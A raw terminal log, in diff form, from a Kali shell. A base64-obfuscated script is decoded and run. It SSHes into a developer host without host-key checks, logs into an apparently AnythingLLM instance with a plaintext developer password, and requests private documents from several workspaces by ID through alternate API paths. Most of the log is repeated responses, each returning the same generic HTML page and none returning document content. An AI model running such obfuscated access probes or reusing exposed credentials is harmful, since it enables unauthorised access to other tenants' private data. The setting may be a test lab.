@@ -1,0 +1,738 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r7.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKc2V0ICtlCkNBPS9ob21lL3Jvd2FuLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkE9aHR0cHM6Ly9hc3Npc3RhbnQua2VwbGVyb3BzLnRlc3QKVE9LPSQoY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1YIFBPU1QgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3sidXNlcm5hbWUiOiJyb3dhbi5pdG8iLCJwYXNzd29yZCI6ImZrX2RldmVsb3Blcl95VVdUS1NxcmMxNnkzSzVfNURmUTdxYWNmdDliLTl4byJ9JyAiJEEvYXBpL3JlcXVlc3QtdG9rZW4iIHwgcHl0aG9uMyAtYyAnaW1wb3J0IGpzb24sc3lzO3ByaW50KGpzb24ubG9hZChzeXMuc3RkaW4pWyJ0b2tlbiJdKScpCkg9IkF1dGhvcml6YXRpb246IEJlYXJlciAkVE9LIgpmb3IgcGFpciBpbiAic3VwcG9ydC1wcml2YXRlOjFiOWFkYjkyLTY0M2QtNDg4OC05Y2M0LTUzYTU2YjczNzU0YiIgInN1cHBvcnQtcHJpdmF0ZTplOTNmMDM2OC1jNmYyLTRhY2ItOGFlMC05NjRhMDNiMzQ2OTgiICJzdXBwb3J0LXByaXZhdGU6Mzg0Y2QwZmEtNGMwNy00MDljLWJjNzEtNjcwMjNjYjczMTU4IiAic3VwcG9ydC1wcml2YXRlOjBjMTEyYjRjLTgyYTctNGIwNS05MmRmLTZmNDAwMTA5ZjdmMiIgInJpbGxoYXZlbi1zdXBwb3J0OjcwMzYxMDJjLWI2NjQtNDBiYi04OTI1LWUwMDIwYzIxNTc2NCIgInJpbGxoYXZlbi1zdXBwb3J0OmQ1NTE4ZGQ0LTMxNTktNDRlMC1iMThhLWI5OWZjOWEwYjU5OCIgImZpZWxkbGluay1vcGVyYXRpb25zOjFjMGZlNDU0LTZlZWMtNDQ4Yi1iMmU0LTEwMTk0NTdjNDk1YiI7IGRvCiBzPSR7cGFpciUlOip9OyBkPSR7cGFpciMqOn0KIGVjaG8gIiMjIyMjIyMjIyMgRE9DICRkIgogZm9yIHAgaW4gIi9hcGkvZG9jdW1lbnQvJGQiICIvYXBpL3dvcmtzcGFjZS8kcy9kb2N1bWVudC8kZCIgIi9hcGkvd29ya3NwYWNlLyRzL2RvY3VtZW50LyRkP21vZGU9cmF3IjsgZG8KICAgZWNobyAiLS0tICRwIgogICBjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLUggIiRIIiAtaSAiJEEkcCIgfCBoZWFkIC1jIDE1MDA7IGVjaG8KIGRvbmUKZG9uZQplY2hvICIjIyMjIyMjIyMjIERPQ0xJU1QiCmZvciBzIGluIHN1cHBvcnQtcHJpdmF0ZSByaWxsaGF2ZW4tc3VwcG9ydCBmaWVsZGxpbmstb3BlcmF0aW9uczsgZG8KIGVjaG8gIi0tLSAkcyI7IGN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtSCAiJEgiIC1pICIkQS9hcGkvd29ya3NwYWNlLyRzL2RvY3VtZW50cyIgfCBoZWFkIC1jIDgwMDsgZWNobwpkb25lCklOTkVSCmVjaG8gRE9ORV9NQVJLXyRSQU5ET00K
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r7.sh; bash /tmp/r7.sh; echo DONEMARK_1795199194717$((6*7))
+########## DOC 1b9adb92-643d-4888-9cc4-53a56b73754b
+--- /api/document/1b9adb92-643d-4888-9cc4-53a56b73754b
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+--- /api/workspace/support-private/document/1b9adb92-643d-4888-9cc4-53a56b73754b
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+--- /api/workspace/support-private/document/1b9adb92-643d-4888-9cc4-53a56b73754b?mode=raw
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+########## DOC e93f0368-c6f2-4acb-8ae0-964a03b34698
+--- /api/document/e93f0368-c6f2-4acb-8ae0-964a03b34698
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+--- /api/workspace/support-private/document/e93f0368-c6f2-4acb-8ae0-964a03b34698
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+--- /api/workspace/support-private/document/e93f0368-c6f2-4acb-8ae0-964a03b34698?mode=raw
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+########## DOC 384cd0fa-4c07-409c-bc71-67023cb73158
+--- /api/document/384cd0fa-4c07-409c-bc71-67023cb73158
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+--- /api/workspace/support-private/document/384cd0fa-4c07-409c-bc71-67023cb73158
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+--- /api/workspace/support-private/document/384cd0fa-4c07-409c-bc71-67023cb73158?mode=raw
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+########## DOC 0c112b4c-82a7-4b05-92df-6f400109f7f2
+--- /api/document/0c112b4c-82a7-4b05-92df-6f400109f7f2
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+--- /api/workspace/support-private/document/0c112b4c-82a7-4b05-92df-6f400109f7f2
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+--- /api/workspace/support-private/document/0c112b4c-82a7-4b05-92df-6f400109f7f2?mode=raw
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+########## DOC 7036102c-b664-40bb-8925-e0020c215764
+--- /api/document/7036102c-b664-40bb-8925-e0020c215764
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+--- /api/workspace/rillhaven-support/document/7036102c-b664-40bb-8925-e0020c215764
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+--- /api/workspace/rillhaven-support/document/7036102c-b664-40bb-8925-e0020c215764?mode=raw
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+########## DOC d5518dd4-3159-44e0-b18a-b99fc9a0b598
+--- /api/document/d5518dd4-3159-44e0-b18a-b99fc9a0b598
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+--- /api/workspace/rillhaven-support/document/d5518dd4-3159-44e0-b18a-b99fc9a0b598
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+--- /api/workspace/rillhaven-support/document/d5518dd4-3159-44e0-b18a-b99fc9a0b598?mode=raw
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+########## DOC 1c0fe454-6eec-448b-b2e4-1019457c495b
+--- /api/document/1c0fe454-6eec-448b-b2e4-1019457c495b
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
